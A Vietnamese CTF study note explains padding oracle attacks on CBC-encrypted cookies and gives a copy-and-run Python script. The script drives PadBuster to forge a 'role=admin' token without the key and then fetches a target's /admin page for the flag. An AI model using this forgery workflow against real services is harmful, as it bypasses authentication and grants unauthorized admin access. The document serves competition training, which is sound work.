# Padding Oracle (dò từng byte dựa vào câu trả lời của server để giải mã)

Khi mã hoá dữ liệu theo kiểu CBC (1 kiểu mã hoá xử lý theo từng khối 16 byte nối tiếp nhau), phần cuối dữ liệu phải được "đệm" (padding) thêm vài byte cho đủ khối, theo 1 chuẩn cố định. Nếu server trả lời KHÁC NHAU giữa trường hợp "đệm sai" (báo lỗi) và "đệm đúng nhưng nội dung bên trong vô nghĩa" (báo lỗi khác, hoặc không lỗi), bạn có thể dùng chính câu trả lời đó như 1 "cái máy trả lời đúng/sai" — dò từng byte một, cuối cùng giải mã được TOÀN BỘ dữ liệu, mà không cần biết khoá bí mật. Nguy hiểm hơn, kỹ thuật này còn cho phép bạn TỰ MÃ HOÁ dữ liệu mới (ví dụ tự tạo cookie `role=admin`) dù không biết khoá.

Trên Burp bạn nhận ra lỗi này khi: cookie/token là chuỗi hex hoặc base64 có độ dài luôn là bội số của 16 byte, và khi bạn sửa 1 ký tự trong đó rồi gửi lại, server trả về lỗi liên quan tới "decrypt"/"padding" khác với lỗi thông thường.

## Cài trước ngày thi (không có Internet lúc thi)

```bash
# chạy 1 lần trước ngày thi, cần Internet
git clone --depth 1 https://github.com/AonCyberLabs/PadBuster.git ~/hoc/CTF/Tools/web/padbuster
# PadBuster viết bằng Perl, thường có sẵn trên Linux -- kiểm tra: perl -v
```

Script dưới gọi thẳng PadBuster qua `subprocess` (không cần thư viện Python nào ngoài `requests` cho phần gửi flag).

## Snippet copy-là-chạy

```python
import re
import subprocess

import requests

base = "http://target"
s = requests.Session()
s.verify = False

PADBUSTER_DIR = "/home/ld/hoc/CTF/Tools/web/padbuster"
FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")


def forge_admin_token(host, sample_token_hex):
    # Dùng PadBuster để TỰ MÃ HOÁ 1 token mới chứa "role=admin", không cần biết khoá
    # -plaintext: nội dung bạn muốn mã hoá ra token mới
    # -encoding 1: token dạng hex thường (0=base64, 2=hex-upper, xem PadBuster --help nếu khác)
    # -noiv: token KHÔNG có khối IV ghép ở đầu (bỏ tham số này nếu token dài hơn số khối dữ liệu 1 khối)
    out = subprocess.run(
        [
            "perl", "padBuster.pl",   # tên file đúng là chữ B thường ở "pad" -- Linux phân biệt hoa/thường, gõ sai là báo "No such file"
            f"http://{host}/page",
            sample_token_hex, "16",
            "-cookies", f"auth={sample_token_hex}",
            "-plaintext", "role=admin",
            "-encoding", "1",
            "-noiv",
        ],
        cwd=PADBUSTER_DIR,
        capture_output=True,
        text=True,
        timeout=120,
    )
    m = re.search(r"New Cookie: auth=(\S+)", out.stdout)
    return m.group(1) if m else None


def solve_one(session, base_url):
    host = base_url.replace("http://", "").replace("https://", "")
    # Token mẫu lấy từ 1 request thật đã bắt trên Burp (cookie auth=...)
    sample_token_hex = "deadbeef00112233deadbeef00112233"

    forged = forge_admin_token(host, sample_token_hex)
    if not forged:
        return None  # PadBuster không dò ra oracle -- xem "Lưu ý nhanh" bên dưới

    try:
        r = session.get(f"{base_url}/admin", cookies={"auth": forged}, timeout=5)
    except requests.RequestException:
        return None

    m = FLAG_RE.search(r.text)
    return m.group(0) if m else None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- **Vì sao gọi PadBuster bằng `subprocess` thay vì viết thuật toán tay**: thuật toán dò byte-theo-byte của padding oracle khá rối (XOR, thử 256 giá trị mỗi byte), PadBuster đã làm sẵn và kiểm thử kỹ — Python chỉ cần "bấm nút chạy nó" rồi đọc lại kết quả in ra, giống việc gọi 1 tool dòng lệnh khác (xem `02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md` mục 3).
- **`-plaintext "role=admin"`**: đây là phần mạnh nhất của PadBuster — không chỉ giải mã, mà còn tự tính ra 1 token HEX MỚI đã "mã hoá giả" chứa đúng nội dung bạn muốn, dù không biết khoá thật.
- Khi chạy lần đầu bằng tay (không qua script), PadBuster sẽ hỏi bạn chọn "error string" — tức là hỏi bạn chỉ ra chuỗi/độ dài nào trong response là dấu hiệu "lỗi padding". Đây là bước cần làm tay 1 lần bằng Burp Intruder trước (sửa byte cuối token, gửi 256 lần, xem response chia thành mấy nhóm) để biết cách trả lời PadBuster.
- `re.search(r"New Cookie: auth=(\S+)", out.stdout)` chỉ là tìm dòng PadBuster in ra token mới, lấy đúng phần sau `auth=` — xem lại cách dùng regex ở `02_Chuoi_Request/04_Doc_Response.md` nếu chưa quen.

## Lưu ý nhanh

- Mỗi đội thường dùng KHOÁ MÃ HOÁ khác nhau (nếu service random khoá theo team) — khác các bài command injection/SQLi, bước `forge_admin_token` ở trên thường phải chạy LẠI riêng cho từng host, không tái dùng được 1 token chung.
- Nếu PadBuster báo "No Errors were detected... unable to determine padding fail": server không trả response khác biệt rõ ràng theo cách PadBuster tự nhận diện — thử xem có cần thêm tham số `-error "chuỗi lỗi cụ thể"` (tự dò bằng Burp trước, theo mục trên) hay không.
- Nếu giải mã ra toàn ký tự rác: có thể token gồm cả IV (1 khối phụ ở đầu) — bỏ tham số `-noiv` hoặc đổi cách chỉ định.
- Bài này KHÔNG áp dụng nếu server dùng AES-GCM, hoặc luôn trả đúng 1 thông báo lỗi chung cho mọi lỗi giải mã (không có oracle để dò).
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
